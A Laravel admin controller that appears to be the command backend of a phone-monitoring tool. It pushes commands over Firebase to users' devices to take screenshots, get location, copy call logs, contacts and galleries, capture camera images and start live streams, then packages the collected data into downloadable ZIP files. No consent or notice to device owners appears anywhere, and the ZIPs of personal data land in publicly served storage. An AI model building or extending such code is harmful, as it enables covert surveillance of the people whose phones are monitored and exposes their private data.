<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;

class UserController extends Controller
{
    public function index()
    {
        $users = User::latest()->paginate(10);
        return view('admin.users.index', compact('users'));
    }

    public function show(User $user)
    {
        // Load relationships needed for the view
        $user->load(['device_logs' => function($query) {
            $query->latest()->take(50);
        }, 'media', 'backups']);
        
        return view('admin.users.show', compact('user'));
    }

    public function command(Request $request, User $user, $type)
    {
        $data = $request->all();
        $payload = null;
        $fcmAction = $type;

        // Map types to FCM actions and validate payload
        switch ($type) {
            case 'screenshot':
            case 'request_location':
            case 'backup_call_log':
            case 'backup_contacts':
                // No extra payload needed
                break;
            case 'capture_image':
                $payload = ['camera_facing' => $data['camera_facing'] ?? 'back'];
                break;
            case 'backup_gallery':
                $payload = ['media_type' => $data['media_type'] ?? 'all'];
                break;
            case 'start_stream':
                // special handling below
                break;
            default:
                return response()->json(['error' => 'Invalid command'], 400);
        }

        // Create Command Log
        $log = \App\Models\CommandLog::create([
            'user_id' => $user->id,
            'admin_id' => auth()->id(),
            'command' => $type,
            'status' => 'pending',
            'payload' => $payload,
        ]);

        if (!$user->fcm_token) {
            return response()->json(['error' => 'User has no FCM Token'], 400);
        }

        try {
            // Setup Google Auth
            $credentialsPath = storage_path('app/firebase_credentials.json');
            if (!file_exists($credentialsPath)) return response()->json(['error' => 'Firebase credentials missing'], 500);
            
            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                'https://www.googleapis.com/auth/firebase.messaging',
                $credentialsPath
            );
            $token = $credentials->fetchAuthToken();
            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
            $projectId = $jsonKey['project_id'];

            // Prepare Data
            $fcmData = [
                'action' => $fcmAction,
                'command_id' => (string) $log->id,
            ];
            
            if ($payload) {
                $fcmData = array_merge($fcmData, $payload);
            }

            // Special Case: Start Stream
            if ($type === 'start_stream') {
                $stream = \App\Models\LiveStream::create([
                    'user_id' => $user->id,
                    'status' => 'active',
                    'started_at' => now(),
                ]);
                $fcmData['live_stream_id'] = (string) $stream->id;
                
                // Send FCM
                $this->sendFcm($projectId, $token['access_token'], $user->fcm_token, $fcmData);
                
                return response()->json([
                    'success' => true, 
                    'message' => 'Stream started',
                    'stream_url' => route('admin.streams.show', $stream->id) 
                ]);
            }

            // Standard Send
            $this->sendFcm($projectId, $token['access_token'], $user->fcm_token, $fcmData);

            return response()->json(['success' => true, 'message' => 'Command sent successfully']);

        } catch (\Exception $e) {
            return response()->json(['error' => $e->getMessage()], 500);
        }
    }

    public function downloadZip(User $user)
    {
        // For large files on shared hosting, creating on disk is safer than PHP streaming
        set_time_limit(0); 
        ini_set('memory_limit', '2048M');
        
        $user->load(['media', 'backups']);

        $zipName = "full_backup_{$user->name}_{$user->id}_" . now()->timestamp . ".zip";
        $zipRelativePath = "temp/{$zipName}";
        $zipFullPath = storage_path("app/public/{$zipRelativePath}");
        
        if (!file_exists(storage_path('app/public/temp'))) {
            mkdir(storage_path('app/public/temp'), 0755, true);
        }

        // Clean any output buffers
        while (ob_get_level()) {
            ob_end_clean();
        }

        $zip = new \ZipArchive;
        if ($zip->open($zipFullPath, \ZipArchive::CREATE | \ZipArchive::OVERWRITE) === TRUE) {
            // 1. Add Media
            foreach ($user->media as $media) {
                if ($media->file_path) {
                    // Try absolute storage path first
                    $fullPath = storage_path('app/public/' . $media->file_path);
                    
                    if (!file_exists($fullPath)) {
                        // Fallback: check if the path already includes storage/app/public
                        $fullPath = storage_path($media->file_path);
                    }

                    if (file_exists($fullPath) && !is_dir($fullPath)) {
                        $category = ucfirst($media->category ?? 'Media');
                        $fileName = $media->id . '_' . basename($media->file_path);
                        $zip->addFile($fullPath, "Images/{$category}/{$fileName}");
                    }
                }
            }

            // 2. Add Backups
            foreach ($user->backups as $backup) {
                $category = ucfirst($backup->type);
                if (isset($backup->file_path) && $backup->file_path) {
                    $fullPath = storage_path('app/public/' . $backup->file_path);
                    if (!file_exists($fullPath)) {
                        $fullPath = storage_path($backup->file_path);
                    }
                    
                    if (file_exists($fullPath) && !is_dir($fullPath)) {
                        $zip->addFile($fullPath, "Data_Backups/{$category}/" . basename($backup->file_path));
                    }
                } elseif (!empty($backup->data)) {
                    $zip->addFromString("Data_Backups/{$category}/{$backup->type}_" . now()->timestamp . ".json", $backup->data);
                }
            }

            $zip->close();
        } else {
            return response()->json(['success' => false, 'error' => 'Could not create ZIP file on disk.'], 500);
        }

        // Return JSON with URL so the frontend can redirect to the static file
        return response()->json([
            'success' => true,
            'url' => \Storage::disk('public')->url($zipRelativePath)
        ]);
    }

    private function sendFcm($projectId, $accessToken, $deviceToken, $data)
    {
        $client = new \GuzzleHttp\Client();
        $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
            'headers' => [
                'Authorization' => 'Bearer ' . $accessToken,
                'Content-Type' => 'application/json',
            ],
            'json' => [
                'message' => [
                    'token' => $deviceToken,
                    'data' => $data,
                ],
            ],
        ]);
    }
}
